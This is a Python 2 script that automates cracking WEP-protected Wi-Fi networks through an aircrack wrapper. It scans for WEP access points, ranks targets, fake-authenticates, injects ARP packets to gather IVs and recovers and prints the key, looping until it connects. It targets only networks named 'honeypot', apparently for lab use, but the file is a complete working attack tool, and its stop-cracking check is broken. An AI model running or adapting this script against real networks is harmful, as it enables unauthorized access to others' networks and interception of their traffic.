#!/usr/bin/python

import sys, time
import aircrack

stopSurveying = False
stopCracking = False

def findVulnerableNetworks(attack_props, min_time=15, max_time=None):
    """returns a list of vulnerable networks"""
    print "looking for vulnerable networks"
    detected_ap_macs = []
    crackable_aps = []
    monitor = aircrack.AirMonitor(attack_props)
    
    counter = 0
    while True:
        time.sleep(1.0)
        
        if stopSurveying:
            break
        
        counter += 1
        sys.stdout.write("\r\tscanning - networks: %d - vulnerable: %d - " % (len(monitor.aps), len(crackable_aps)))
        if counter % 2:
            sys.stdout.write("\\")
        else:
            sys.stdout.write("/")
        if counter % 10:
            monitor.update()

            for ap_mac in monitor.aps:
                if ap_mac not in detected_ap_macs:
                    detected_ap_macs.append(ap_mac)
                    ap = monitor.aps[ap_mac]
                    #print "\n\tdetected new network: %s" % ap
                    # weight WEP as easy
                else:
                    ap = monitor.aps[ap_mac]
                if ap.key is None and ap.privacy.lower() == "wep" and "honeypot" in ap.essid.lower() and ap not in crackable_aps:
                    #print "\n\tcrackable network: %s" % ap
                    crackable_aps.append(ap)
                    attack_props.crackable_aps.append(ap_mac)
        sys.stdout.flush()
        if counter >= min_time and len(crackable_aps) > 0:
            break
    monitor.stop()
    print "\nscan complete found %d vulnerable networks" % len(crackable_aps)
            
    for ap in attack_props.aps.values():
        ap.vulnerability = 0    
            
    for ap in crackable_aps:
        if ap.privacy.lower() == "wep":
            ap.vulnerability += 5*counter
        ap.vulnerability += ap.ivs
    
    return crackable_aps

def findNextTarget(attack_props):
    target = None    
    for ap in attack_props.crackable_aps:
        if ap.key is None:
            if ap.crack_attempts == 0:
                if target is None or (target.vulnerability < ap.vulnerability):
                    target = ap
    return target

def crackWEP(attack_props, max_time=300):
    """attempts to crack the passed in wep network"""
    # fake authenticate with the target to associate for packet injection
    attack_props.target.crack_attempts += 1
    injector = aircrack.AirPlay(attack_props)
    print "\tassociating with target AP"
    if not injector.fakeAuthenticate():
        print "\tfailed to authenticate with ap"
        return False
    
    print "\tcapturing ivs from target"
    # start capturing ivs
    capturer = aircrack.AirCapture(attack_props)
    
    print "\tinjecting packets into target network"
    injector.startArpInjection()
    
    cracker = None
    try:
        for i in range(1, max_time, 5):
            time.sleep(5.0)
            
            if stopCracking:
                False
            
            capturer.update()
            if cracker is None:
                sys.stdout.write("\r\tcaptured ivs: %s - stations: %d - %0.0f%%" % (attack_props.target.ivs, len(attack_props.target.stations), float(i)/float(max_time)*100.0))
                sys.stdout.flush()
                if attack_props.target.ivs > 10000:
                    cracker = aircrack.AirCracker(attack_props)
                elif i > 60 and attack_props.target.ivs < 400:
                    print "\n\tfailing to generate enough traffic"
                    break
            else:
                if not cracker.isRunning():
                    # this will autoset the kep on the target if found

                    if cracker.checkResults():
                        print "\tcracker succesfull"
                    else:
                        print "\tcracker failed"
                    cracker = None
                    break
                
                sys.stdout.write("\r\tcracking ivs: %s - stations: %d - %0.0f%%" % (attack_props.target.ivs, len(attack_props.target.stations), float(i)/float(max_time)*100.0))
                sys.stdout.flush()
    except:
        print "!!! exception occured !!!"
        # TODO dump stack
        
    if cracker != None:
        cracker.stop()
    injector.stop()
    capturer.stop()
    attack_props.target.cracked = (attack_props.target.key != None)
    return attack_props.target.cracked

def getConnected(attack_props):
    """runs until it gets a connection"""
    attack_props.crackable_aps = []
    while True:
        target = findNextTarget(attack_props)
        if target != None:
            print "found ideal target: %s" % target
            attack_props.setTarget(target)
            if crackWEP(attack_props):
                print "\tCRACKED network(%s) wep key: '%s'" % (target.essid, target.key)
                return True
            else:
                print "\tFAILED to crack network(%s)" % (target.essid)
        else:
            attack_props.crackable_aps = findVulnerableNetworks(attack_props)


def main():
    monitor_device = aircrack.NetworkInterface("mon0")
    inject_device = aircrack.NetworkInterface("wlan0")
    if not aircrack.setMonitorMode(inject_device, monitor_device):
        sys.exit(1)

    if inject_device.getMac().count(':') != 5:
        print "\tinvalid mac for injector device: %s" % inject_device.getMac()
        sys.exit(1)        
    if monitor_device.getMac().count(':') != 5:
        print "\tinvalid mac for monitor device: %s" % monitor_device.getMac()
        sys.exit(1)
    attack_props = aircrack.AttackProperties(monitor_device, inject_device, "/caps")
    
    # run for ever 
    getConnected(attack_props)
    #findVulnerableNetworks(attack_props, 300)


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
       print "program terminated by user" 
        
        
